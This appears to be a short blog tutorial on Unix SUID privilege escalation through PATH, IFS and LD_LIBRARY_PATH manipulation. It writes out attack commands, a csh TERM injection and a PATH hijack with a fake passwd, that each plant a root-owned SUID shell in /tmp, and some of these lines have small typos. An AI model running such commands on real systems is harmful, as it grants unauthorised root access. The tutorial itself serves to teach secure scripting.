
Some Hacking Tricks on SUID programs.
<!--more--->

A SUID program is a program that will always run as its owner's privilege.

A normal program is the same privilege with its runner, while a SUID program always run as its owner.

A SUID program is -rw**s**r-xr-x . The forth privilege bit is `s`.

```bash
chmod 4755 file
```

The above command can turn on the Set-UID bit.



Every Unix program is running in a specific environment, which consists of  a table of environment variables.

In C, a program can use `getenv()` to get the values of environment variables.

In C, `system(const char * cmd)` function will first invoke the `/bin/sh` program, and then let the shell execute `cmd`

#### Some important variables

##### PATH

A hacker can execute following commands to set the current dir as the first item in `PATH`.

```bash
PATH=".:$PATH";
export PATH
```



##### IFS

IFS determines the characters which would be interpreted as white space.

```bash
IFS="/ \t\n";
export IFS
```

The above commands would let the '/' as space, which means any program attempt to use an absolute PATH will be translate into spaces.

`system("/bin/mail root")` ---> `bin mail root`

thus, the hacker can run his own program called `bin`

However, this bug has been fixed: the invoked new shell process will not inherbit IFS variable.



##### LD_LIBRARY_PATH

In Linux, most program requires dynamic link libraries at run time.

Dynamic linker/loader: `ld.so`/`ld-linux.so`.

```bash
ldd /bin/ls
```

That will list all shared libraries that `ls` needed.

**LD_LIBRARY_PATH** contains a set of directories that `ld.so` will look for runtime libraries.

```bash
setenv LD_LIBRARY_PATH .:$LD_LIBRARY_PATH 
```





### Never use C-shell for SUID scripts

change-pass is a script like this:

```bash
#!/bin/csh -b
set user=$1
passwd $user
```

This script is useful for root user to help changing other users' password.



But for the reason that csh scripts are vulnerable to manipulating environment variables.

The hacker can run follow instructions:

```csh
 env TERM='`cp /bin/sh /tmp/sh;chown root /tmp/sh;
 chmod 4755/tmp/sh`'
 change-pass
```



### Use Full PATH

Now,we change the script to this one:

```ksh
#!/bin/ksh
user=$1
passwd $user
```

This is also vulnerable, because the program uses relative path names

The hacker can run following instructions to run his own program:

```bash
export PATH='/tmp'
echo "cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755/tmp/sh" >/tmp/passwd"
./change-pass
```

Then the script runs `/tmp/passwd` instead of  `/usr/bin/passwd`

